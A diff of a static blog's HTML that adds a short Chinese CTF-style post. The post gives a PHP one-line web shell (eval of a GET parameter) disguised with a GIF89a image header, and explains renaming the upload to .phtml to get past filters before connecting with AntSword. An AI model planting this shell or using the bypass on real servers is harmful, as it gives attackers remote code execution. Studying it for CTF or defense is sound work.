@@ -71,6 +71,40 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-GIF89a" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/09/26/GIF89a/" class="article-date">
+  <time class="dt-published" datetime="2021-09-26T02:16:47.927Z" itemprop="datePublished">2021-09-26</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_GET</span>[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>通常，在嵌入了php脚本的html中，使用 phtml作为后缀名；完全是php写的，则使用php作为后缀名。这两种文件，web服务器都会用php解释器进行解析。</p>
+<p>当不能使用php代码直接注入时可以改为phtml格式加入GIF89a(图片头文件欺骗)，后台认为是图片,上传后再执行木马。</p>
+<p>先将文件改为.gif欺骗网址第一层，抓包将filename改为以.phtml结尾并以这种方式进行，GIF89a则负责骗过第二层。</p>
+<p><img src="https://img-blog.csdnimg.cn/97cb183433d94d4b9f8dd45ee661b862.png" alt="请添加图片描述"></p>
+<p>通过蚁剑一般连接的是：url/upload/文件名<br>此题为：<img src="https://img-blog.csdnimg.cn/d84d1c9b84874534a08d06b09535dcdb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA55-z5pif7oCx,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br>蚁剑连接即可</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/09/26/GIF89a/" data-id="cku0le3890000ogt15329b7zm" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-mysql记录" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/09/26/mysql%E8%AE%B0%E5%BD%95/" class="article-date">
@@ -148,7 +182,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/09/26/mysql%E8%AE%B0%E5%BD%95/" data-id="cku0kyc8e0000fst1ffcy7u50" data-title="" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/09/26/mysql%E8%AE%B0%E5%BD%95/" data-id="cku0le38u0001ogt1fnl5h8kk" data-title="" class="article-share-link">Share</a>
       
       
       
@@ -189,6 +223,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/09/26/GIF89a/">(no title)</a>
+          </li>
         
           <li>
             <a href="/2021/09/26/mysql%E8%AE%B0%E5%BD%95/">(no title)</a>
